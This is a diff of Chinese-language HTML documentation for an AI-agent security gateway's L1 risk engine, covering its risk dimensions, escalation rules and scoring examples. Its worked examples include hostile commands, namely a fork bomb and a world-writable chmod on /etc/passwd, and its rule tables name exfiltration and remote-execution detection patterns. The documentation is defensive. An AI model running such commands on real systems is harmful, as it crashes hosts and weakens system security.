-<p class="admonition-title">Gateway 层的 DEFER</p>
-<p>上表是 L1 引擎本身的映射。在实际部署中，Gateway 层会根据 OpenClaw 集成配置将 HIGH 风险映射为 <code>DEFER</code>（交由运维人员审批），而非直接 BLOCK。这是 Gateway 对 L1 判决的策略覆盖，不是 L1 本身的行为。</p>
-</div>
+<p>非阻塞事件类型（<code>post_action</code>、<code>post_response</code>、<code>error</code>、<code>session</code>、<code>pre_prompt</code>）始终返回 <code>ALLOW</code>，由 L1 引擎直接 short-circuit。</p>
 <hr />
-<h2 id="risk-snapshot">RiskSnapshot — 评估快照<a class="headerlink" href="#risk-snapshot" title="Permanent link">&para;</a></h2>
-<p><code>RiskSnapshot</code> 是 L1 评估的完整输出，一旦生成即不可变 (immutable)。它在整个决策和重试生命周期中保持不变，是后续 L2/L3 分析的基准输入。</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="k">class</span> <span class="nc">RiskSnapshot</span><span class="p">(</span><span class="n">BaseModel</span><span class="p">):</span>
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>    <span class="n">risk_level</span><span class="p">:</span> <span class="n">RiskLevel</span>               <span class="c1"># 最终风险等级</span>
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>    <span class="n">composite_score</span><span class="p">:</span> <span class="nb">float</span>               <span class="c1"># 合成分 (连续浮点, v2 公式输出)</span>
-</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>    <span class="n">dimensions</span><span class="p">:</span> <span class="n">RiskDimensions</span>           <span class="c1"># D1-D6 各维度分值</span>
-</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>    <span class="n">short_circuit_rule</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span>    <span class="c1"># 命中的短路规则 (SC-1/SC-2/SC-3)</span>
-</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>    <span class="n">missing_dimensions</span><span class="p">:</span> <span class="nb">list</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span>        <span class="c1"># 缺失维度列表 (如 [&quot;d1&quot;, &quot;d5&quot;])</span>
-</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>    <span class="n">classified_by</span><span class="p">:</span> <span class="n">ClassifiedBy</span>          <span class="c1"># 分类层级 (L1/L2/manual)</span>
-</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>    <span class="n">classified_at</span><span class="p">:</span> <span class="nb">str</span>                   <span class="c1"># UTC ISO8601 时间戳</span>
-</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>    <span class="n">override</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="n">RiskOverride</span><span class="p">]</span>     <span class="c1"># L2/manual 覆盖信息</span>
-</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>    <span class="n">l1_snapshot</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="n">RiskSnapshot</span><span class="p">]</span>  <span class="c1"># L2 升级时保留的 L1 原始快照</span>
-</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>    <span class="n">l3_trace</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">dict</span><span class="p">]</span>             <span class="c1"># L3 推理轨迹 (不序列化到外部)</span>
+<h2 id="risk-snapshot">风险评估快照（RiskSnapshot）<a class="headerlink" href="#risk-snapshot" title="Permanent link">&para;</a></h2>
+<p><code>RiskSnapshot</code> 是 L1 评估的完整输出，<strong>Pydantic frozen 模型</strong>，一旦生成即不可变。它在整个决策和重试生命周期中保持不变，是后续 L2/L3 分析的基准输入。</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="k">class</span> <span class="nc">RiskSnapshot</span><span class="p">(</span><span class="n">BaseModel</span><span class="p">):</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>    <span class="n">model_config</span> <span class="o">=</span> <span class="n">ConfigDict</span><span class="p">(</span><span class="n">frozen</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>    <span class="n">risk_level</span><span class="p">:</span> <span class="n">RiskLevel</span>                      <span class="c1"># 最终风险等级</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>    <span class="n">composite_score</span><span class="p">:</span> <span class="nb">float</span>                     <span class="c1"># &gt;= 0；v2: base × injection_multiplier</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>    <span class="n">dimensions</span><span class="p">:</span> <span class="n">RiskDimensions</span>                 <span class="c1"># D1-D6 各维度分值</span>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>    <span class="n">short_circuit_rule</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span>          <span class="c1"># SC-1..SC-8 或 None</span>
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>    <span class="n">missing_dimensions</span><span class="p">:</span> <span class="nb">list</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span>              <span class="c1"># 例如 [&quot;d1&quot;, &quot;d5&quot;]</span>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>    <span class="n">classified_by</span><span class="p">:</span> <span class="n">ClassifiedBy</span>                <span class="c1"># L1 / L2 / L3 / manual</span>
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>    <span class="n">classified_at</span><span class="p">:</span> <span class="nb">str</span>                         <span class="c1"># UTC ISO8601</span>
+</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>    <span class="n">override</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="n">RiskOverride</span><span class="p">]</span>           <span class="c1"># L2 升级时的原始等级与原因</span>
+</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>    <span class="n">l1_snapshot</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="n">RiskSnapshot</span><span class="p">]</span>        <span class="c1"># L2 升级时保留的 L1 原始快照</span>
+</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>    <span class="n">l3_trace</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">dict</span><span class="p">]</span>                   <span class="c1"># L3 推理轨迹（exclude=True，不外发）</span>
+</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>    <span class="n">l2_l3_summary</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">dict</span><span class="p">]</span>              <span class="c1"># L2/L3 执行摘要</span>
+</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a>    <span class="n">rule_hits</span><span class="p">:</span> <span class="nb">list</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span>                       <span class="c1"># skill-trust / effect / taint 规则命中</span>
+</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a>    <span class="n">skill_trust_findings</span><span class="p">:</span> <span class="nb">list</span><span class="p">[</span><span class="nb">dict</span><span class="p">]</span>           <span class="c1"># skill 信任评估证据</span>
+</span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a>    <span class="n">taint_flow_summary</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">dict</span><span class="p">]</span>         <span class="c1"># 污点流证据（rule_ids、command_hash 等）</span>
+</span><span id="__span-10-18"><a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a>    <span class="n">effect_summary</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">dict</span><span class="p">]</span>             <span class="c1"># 行为效果归一化摘要</span>
 </span></code></pre></div>
+<div class="admonition note">
+<p class="admonition-title">ClassifiedBy 枚举</p>
+<p><code>L1</code>、<code>L2</code>、<code>L3</code>、<code>manual</code>。L1 引擎首次产出时为 <code>L1</code>；当 L2/L3 升级了风险等级后，<code>classified_by</code> 改为对应层（<code>L2</code> 或 <code>L3</code>），且 <code>l1_snapshot</code> 字段保留升级前的原始快照。</p>
+</div>
 <h3 id="riskdimensions">RiskDimensions 字段<a class="headerlink" href="#riskdimensions" title="Permanent link">&para;</a></h3>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="k">class</span> <span class="nc">RiskDimensions</span><span class="p">(</span><span class="n">BaseModel</span><span class="p">):</span>
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>    <span class="n">d1</span><span class="p">:</span> <span class="nb">int</span>    <span class="c1"># 0-3, 工具类型危险度</span>
-</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>    <span class="n">d2</span><span class="p">:</span> <span class="nb">int</span>    <span class="c1"># 0-3, 目标路径敏感度</span>
-</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>    <span class="n">d3</span><span class="p">:</span> <span class="nb">int</span>    <span class="c1"># 0-3, 命令模式危险度</span>
-</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>    <span class="n">d4</span><span class="p">:</span> <span class="nb">int</span>    <span class="c1"># 0-2, 会话风险累积</span>
-</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>    <span class="n">d5</span><span class="p">:</span> <span class="nb">int</span>    <span class="c1"># 0-2, Agent 信任等级</span>
-</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>    <span class="n">d6</span><span class="p">:</span> <span class="nb">float</span>  <span class="c1"># 0.0-3.0, 注入检测评分 (三层架构)</span>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="k">class</span> <span class="nc">RiskDimensions</span><span class="p">(</span><span class="n">BaseModel</span><span class="p">):</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>    <span class="n">d1</span><span class="p">:</span> <span class="nb">int</span>    <span class="o">=</span> <span class="n">Field</span><span class="p">(</span><span class="o">...</span><span class="p">,</span> <span class="n">ge</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">le</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>   <span class="c1"># 工具类型危险度</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>    <span class="n">d2</span><span class="p">:</span> <span class="nb">int</span>    <span class="o">=</span> <span class="n">Field</span><span class="p">(</span><span class="o">...</span><span class="p">,</span> <span class="n">ge</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">le</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>   <span class="c1"># 目标路径敏感度</span>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>    <span class="n">d3</span><span class="p">:</span> <span class="nb">int</span>    <span class="o">=</span> <span class="n">Field</span><span class="p">(</span><span class="o">...</span><span class="p">,</span> <span class="n">ge</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">le</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>   <span class="c1"># 命令模式危险度</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>    <span class="n">d4</span><span class="p">:</span> <span class="nb">int</span>    <span class="o">=</span> <span class="n">Field</span><span class="p">(</span><span class="o">...</span><span class="p">,</span> <span class="n">ge</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">le</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>   <span class="c1"># 会话风险累积（含 E-8 频率）</span>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>    <span class="n">d5</span><span class="p">:</span> <span class="nb">int</span>    <span class="o">=</span> <span class="n">Field</span><span class="p">(</span><span class="o">...</span><span class="p">,</span> <span class="n">ge</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">le</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>   <span class="c1"># Agent 信任等级</span>
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>    <span class="n">d6</span><span class="p">:</span> <span class="nb">float</span>  <span class="o">=</span> <span class="n">Field</span><span class="p">(</span><span class="n">default</span><span class="o">=</span><span class="mf">0.0</span><span class="p">,</span> <span class="n">ge</span><span class="o">=</span><span class="mf">0.0</span><span class="p">,</span> <span class="n">le</span><span class="o">=</span><span class="mf">3.0</span><span class="p">)</span>   <span class="c1"># 注入检测评分</span>
 </span></code></pre></div>
+<h3 id="rule_hits">rule_hits 常见来源<a class="headerlink" href="#rule_hits" title="Permanent link">&para;</a></h3>
+<p><code>rule_hits</code> 是一个字符串列表，记录 L1 评估期间触发的非 D1-D6 主线信号，主要来自三类：</p>
+<table>
+<thead>
+<tr>
+<th>来源</th>
+<th>示例 rule_id</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Skill Trust</td>
+<td><code>unknown_skill_identity</code>、<code>skill_hash_mismatch</code>、<code>ambiguous_skill_alias</code>、<code>provenance_label_mismatch</code>、<code>first_use_scan_not_started</code></td>
+<td>见 <a href="../../advanced/skill-trust/">Skill Trust</a></td>
+</tr>
+<tr>
+<td>Effect Envelope</td>
+<td><code>disabled_capability_equivalent</code>、<code>generated_script_future_exec</code>、<code>script_analysis_unavailable</code>、<code>wrapper_chain_unresolved</code></td>
+<td>行为效果归一化命中</td>
+</tr>
+<tr>
+<td>Taint Flow</td>
+<td><code>remote_fetch_to_interpreter</code>、<code>sensitive_source_to_network_sink</code>、<code>archive_extract_then_execute</code>、<code>bulk_destructive_sequence</code>、<code>persistence_entrypoint_write</code>、<code>spreadsheet_downstream_payload</code></td>
+<td>多步污点链</td>
+</tr>
+</tbody>
+</table>
 <hr />
 <h2 id="examples">实际评估示例<a class="headerlink" href="#examples" title="Permanent link">&para;</a></h2>
 <p>以下示例展示不同命令在 D1-D6 各维度的评分过程和最终判决。</p>
 <h3 id="1">示例 1：安全的只读操作<a class="headerlink" href="#1" title="Permanent link">&para;</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>Event: tool_name=&quot;read_file&quot;, payload={&quot;path&quot;: &quot;src/main.py&quot;}
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>Agent: STANDARD trust
-</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>Session: 首次事件
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>Event: tool_name=&quot;read_file&quot;, payload={&quot;path&quot;: &quot;src/main.py&quot;}
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>Agent: STANDARD trust
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>Session: 首次事件
 </span></code></pre></div>
 <table>
 <thead>
@@ -4142,9 +4523,9 @@
 <p><strong>判决：</strong> <code>ALLOW</code> — 安全放行</p>
 <hr />
 <h3 id="2">示例 2：中等风险的包安装<a class="headerlink" href="#2" title="Permanent link">&para;</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>Event: tool_name=&quot;bash&quot;, payload={&quot;command&quot;: &quot;pip install requests&quot;}
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>Agent: STANDARD trust
-</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>Session: 1 次高危历史
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>Event: tool_name=&quot;bash&quot;, payload={&quot;command&quot;: &quot;pip install requests&quot;}
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>Agent: STANDARD trust
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>Session: 1 次高危历史
 </span></code></pre></div>
 <table>
 <thead>
@@ -4187,9 +4568,9 @@
 <p><strong>判决：</strong> <code>ALLOW</code> (审计记录)，触发 L2 分析</p>
 <hr />
 <h3 id="3">示例 3：高危系统操作<a class="headerlink" href="#3" title="Permanent link">&para;</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>Event: tool_name=&quot;bash&quot;, payload={&quot;command&quot;: &quot;sudo chmod 777 /etc/passwd&quot;}
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>Agent: UNTRUSTED
-</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>Session: 3 次高危历史
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>Event: tool_name=&quot;bash&quot;, payload={&quot;command&quot;: &quot;sudo chmod 777 /etc/passwd&quot;}
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>Agent: UNTRUSTED
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>Session: 3 次高危历史
 </span></code></pre></div>
 <table>
 <thead>
@@ -4231,9 +4612,9 @@
 <p><strong>判决：</strong> <code>BLOCK</code> — 绝对禁止，并记录详细原因</p>
 <hr />
 <h3 id="4fork">示例 4：Fork 炸弹<a class="headerlink" href="#4fork" title="Permanent link">&para;</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>Event: tool_name=&quot;bash&quot;, payload={&quot;command&quot;: &quot;:(){ :|:&amp; };:&quot;}
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>Agent: STANDARD trust
-</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>Session: 无历史
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>Event: tool_name=&quot;bash&quot;, payload={&quot;command&quot;: &quot;:(){ :|:&amp; };:&quot;}
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>Agent: STANDARD trust
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>Session: 无历史
 </span></code></pre></div>
 <table>
 <thead>
@@ -4318,55 +4699,92 @@
 </tbody>
 </table>
 <div class="admonition warning">
-<p class="admonition-title">D4 normalization shadow/default-off</p>
+<p class="admonition-title">D4 归一化：默认 shadow 模式</p>
 <p>若引入 D4 归一化、平滑或标准化字段，必须默认以 shadow 指标发布，不能直接替换 <code>dimensions_latest.d4</code>、L1 短路规则或风险阈值。只有在单独配置和测试明确开启后，才可影响判决路径。</p>
 </div>
 <h2 id="escalation">L1 → L2 升级条件<a class="headerlink" href="#escalation" title="Permanent link">&para;</a></h2>
-<p>L1 不仅产生自己的判决，还决定是否将事件升级到 L2 语义分析层。升级检查在 L1 评估完成后进行。</p>
-<p>满足以下<strong>任一条件</strong>即触发 L2：</p>
+<p>L1 不仅产生自己的判决，还决定是否将事件升级到 L2 语义分析层。升级检查由 <code>_should_run_l2()</code> + <code>_automatic_l2_trigger_reason()</code> 共同决定：当 <code>requested_tier ∈ {L2, L3}</code> 时无条件升级；否则依据下表的"自动触发原因"。</p>
+<h3 id="l2">自动 L2 触发原因（按优先级）<a class="headerlink" href="#l2" title="Permanent link">&para;</a></h3>
 <table>
 <thead>
 <tr>
+<th>触发原因</th>
 <th>条件</th>
-<th>说明</th>
+<th>来源</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>显式请求 L2</td>
-<td><code>requested_tier == DecisionTier.L2</code></td>
+<td><code>medium_pre_action</code></td>
+<td><code>event_type == PRE_ACTION</code> 且 L1 风险等级 == <code>MEDIUM</code></td>
+<td><code>policy_engine._automatic_l2_trigger_reason</code></td>
 </tr>
 <tr>
-<td>中等风险的 pre_action</td>
-<td><code>event_type == pre_action</code> 且 <code>risk_level == MEDIUM</code></td>
+<td><code>fspr_package_review</code> / <code>runtime_binding_identity_conflict</code></td>
+<td>Skill Trust routing intent 请求 L2/L3 review</td>
+<td>同上</td>
 </tr>
 <tr>
-<td>关键领域关键词</td>
-<td>事件文本匹配 <code>prod/production/credential/secret/token/password/key</code></td>
+<td><code>key_domain_event</code></td>
+<td>事件文本匹配 <code>KEY_DOMAIN_PATTERN</code>（<code>prod</code>/<code>production</code>/<code>credential</code>/<code>secret</code>/<code>token</code>/<code>password</code>/<code>key</code>）</td>
+<td><code>semantic_analyzer.KEY_DOMAIN_PATTERN</code></td>
 </tr>
 <tr>
-<td>手动升级标志</td>
-<td><code>DecisionContext.session_risk_summary</code> 中含 <code>l2_escalate</code>/<code>force_l2</code> 标志</td>
+<td><code>manual_l2_escalation</code></td>
+<td><code>DecisionContext.session_risk_summary</code> 含手动升级标志</td>
+<td><code>semantic_analyzer.has_manual_l2_escalation_flag</code></td>
 </tr>
 </tbody>
 </table>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="k">def</span> <span class="nf">_should_run_l2</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">event</span><span class="p">,</span> <span class="n">context</span><span class="p">,</span> <span class="n">l1_snapshot</span><span class="p">,</span> <span class="n">requested_tier</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>    <span class="k">if</span> <span class="n">requested_tier</span> <span class="o">==</span> <span class="n">DecisionTier</span><span class="o">.</span><span class="n">L2</span><span class="p">:</span>
-</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>        <span class="k">return</span> <span class="kc">True</span>
-</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>    <span class="k">if</span> <span class="n">event</span><span class="o">.</span><span class="n">event_type</span> <span class="o">==</span> <span class="n">EventType</span><span class="o">.</span><span class="n">PRE_ACTION</span> <span class="ow">and</span> \
-</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>       <span class="n">l1_snapshot</span><span class="o">.</span><span class="n">risk_level</span> <span class="o">==</span> <span class="n">RiskLevel</span><span class="o">.</span><span class="n">MEDIUM</span><span class="p">:</span>
-</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>        <span class="k">return</span> <span class="kc">True</span>
-</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>    <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">_is_key_domain_event</span><span class="p">(</span><span class="n">event</span><span class="p">):</span>
-</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>        <span class="k">return</span> <span class="kc">True</span>
-</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>    <span class="k">return</span> <span class="n">has_manual_l2_escalation_flag</span><span class="p">(</span><span class="n">context</span><span class="p">)</span>
-</span></code></pre></div>
+<h3 id="_3">自动触发的抑制条件<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>抑制条件</th>
+<th>行为</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>requested_tier == L1</code> 且 <code>rule_hits</code> 含 <code>disabled_capability_equivalent</code></td>
+<td>自动触发原因被清空 → 不升级 L2，输出 <code>DEFER</code> 由 operator review</td>
+</tr>
+<tr>
+<td><code>mode == "benchmark"</code> 且 <code>benchmark_l2_auto_enabled == false</code> 且原因 ∈ {<code>medium_pre_action</code>, <code>key_domain_event</code>}</td>
+<td>不调用 L2，写入 <code>l2_l3_summary.disabled_reason = "benchmark_auto_l2_disabled"</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="tier">Tier 重写<a class="headerlink" href="#tier" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>输入</th>
+<th>重写结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ReviewRoutingIntent.recommended_tier == "l3"</code></td>
+<td><code>requested_tier ← L3</code></td>
+</tr>
+<tr>
+<td><code>ReviewRoutingIntent.recommended_tier == "l2"</code> 且 <code>requested_tier == L1</code></td>
+<td><code>requested_tier ← L2</code></td>
+</tr>
+<tr>
+<td><code>requested_tier == L2</code> 且 <code>l3_routing_mode == "replace_l2"</code> 且 analyzer 支持 L3</td>
+<td><code>requested_tier ← L3</code></td>
+</tr>
+</tbody>
+</table>
 <div class="admonition important">
-<p class="admonition-title">升级只增不减</p>
-<p>当 L2 被触发后，L2 的分析结果<strong>只能升级风险等级，不能降级</strong>。如果 L1 判定 MEDIUM，L2 可以升级为 HIGH，但不能降为 LOW。这是 ClawSentry 的核心安全原则之一。</p>
+<p class="admonition-title">升级只增不减（upgrade-only）</p>
+<p><code>_run_l2_analysis</code> 中以 <code>_max_risk_level(target_level, l1_snapshot.risk_level)</code> 强制保证 L2 输出的风险等级不能低于 L1。如果 L2 在指定预算内未完成（<code>actual_tier == DecisionTier.L1</code>），保留 L1 快照并标记 <code>l2_l3_summary.status = "degraded_to_l1"</code>。</p>
 </div>
 <hr />
-<h2 id="fallback">Fallback 决策<a class="headerlink" href="#fallback" title="Permanent link">&para;</a></h2>
-<p>当 Gateway 不可达时（网络中断、服务未启动等），Adapter 使用本地 Fallback 策略生成决策，而非让事件悬挂或无限等待。</p>
+<h2 id="fallback">降级回退<a class="headerlink" href="#fallback" title="Permanent link">&para;</a></h2>
+<p>当 Gateway 不可达时（网络中断、服务未启动等），Adapter 使用本地降级策略生成决策，而非让事件悬挂或无限等待。</p>
 <div class="language-python highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="k">def</span> <span class="nf">make_fallback_decision</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">risk_hints_contain_high_danger</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
 </span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>    <span class="o">...</span>
 </span></code></pre></div>
@@ -4374,7 +4792,7 @@
 <thead>
 <tr>
 <th>事件类型</th>
-<th style="text-align: center;">Fallback 判决</th>
+<th style="text-align: center;">降级判决</th>
 <th>策略</th>
 </tr>
 </thead>
@@ -4408,7 +4826,7 @@
 <hr />
 <h2 id="configuration">配置<a class="headerlink" href="#configuration" title="Permanent link">&para;</a></h2>
 <p>L1 引擎本身<strong>零配置即可运行</strong>。以下环境变量影响与 L1 相关的行为：</p>
-<h3 id="_2">会话策略<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<h3 id="_4">会话策略<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
 <table>
 <thead>
